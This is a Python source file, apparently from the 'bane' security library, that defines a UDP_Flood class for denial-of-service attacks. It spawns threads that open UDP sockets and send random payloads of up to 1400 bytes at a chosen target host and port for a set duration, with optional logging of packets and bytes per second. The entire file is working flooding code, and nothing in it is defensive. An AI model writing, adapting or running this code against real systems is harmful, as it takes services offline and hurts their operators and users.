from bane.ddos.utils import *

class UDP_Flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        interval=0.001,
        min_size=10,
        max_size=10,
        connection=True,
        duration=60,
        threads=1,
        limiting=True,
        logs=False,
    ):
        self.target = u
        self.port = p
        self.interval = interval
        self.min_size = min_size
        self.max_size = max_size
        self.connection = connection
        self.duration = duration
        self.limiting = limiting
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            tm = time.time()
            size = 0
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if self.connection == True:
                        s.connect((self.target, self.port))
                    msg = os.urandom(random.randint(self.min_size, self.max_size))
                    """for x in range(random.randint(self.min_size, self.max_size)):
                        msg += random.choice(Common_Variables.source_string)"""
                    if type(msg)==str  and running_on_python_2==False:
                         msg=msg.encode()
                    if len(msg) > 1400:
                        msg = msg[
                            0:1400
                        ]  # make sure all payloads' sizes are on the right range
                    s.sendto((msg), (self.target, self.port))
                    size += len(msg)
                    self.counter += 1
                    if (self.logs == True) and (int(time.time() - tm) == 1):
                        sys.stdout.write(
                            "\rPackets: {} | Bytes/s: {}   ".format(self.counter, size)
                        )
                        sys.stdout.flush()
                        tm = time.time()
                        size = 0
                    if self.limiting == True:
                        time.sleep(self.interval)
                except:
                    self.fails+=1
                    try:
                        time.sleep(self.interval)
                    except:
                        pass
            self.kill()
        except:
            pass
